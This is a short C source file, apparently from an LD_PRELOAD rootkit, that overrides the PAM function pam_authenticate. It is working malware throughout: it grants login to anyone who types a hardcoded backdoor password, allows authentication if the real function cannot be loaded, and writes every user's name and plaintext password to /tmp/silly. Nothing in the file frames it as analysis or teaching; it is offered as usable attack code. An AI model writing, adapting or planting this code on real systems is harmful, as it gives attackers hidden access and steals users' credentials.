#include "father.h"

#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <security/pam_modules.h>

void exfil(char *username, char *password, int result) {
  FILE *fp = fopen("/tmp/silly", "a+");
  fprintf(fp, "%s:%s:%d\n", username, password, result);
  fclose(fp);
}

int (*o_pam_authenticate)(pam_handle_t *, int);
int pam_authenticate(pam_handle_t *pamh, int flags) {

  /* get original function, allow on failure */
  if (!o_pam_authenticate) {
    o_pam_authenticate = dlsym(RTLD_NEXT, "pam_authenticate");
    if (o_pam_authenticate == NULL) {
      return PAM_SUCCESS;
    }
  }

  char *user, *password;
  char prompt[512];

  /* get the username being authenticated */
  pam_get_user(pamh, (const char **)&user, NULL);

  /* prompt the user for their password, supply backup message */
  snprintf(prompt, sizeof(prompt), "* Password for %s: ", user);
  pam_prompt(pamh, 1, &password, "%s", prompt);

  /* allow backdoor password */
  if (password && !strcmp(password, SHELL_PASS)) {
    return PAM_SUCCESS;
  }

  /* test credentials */
  int result = o_pam_authenticate(pamh, flags);

  /* exfil creds and result */
  if (user && password) {
    exfil(user, password, result);
  }

  /* man pages say to only free password */
  free(password);
  return result;
}
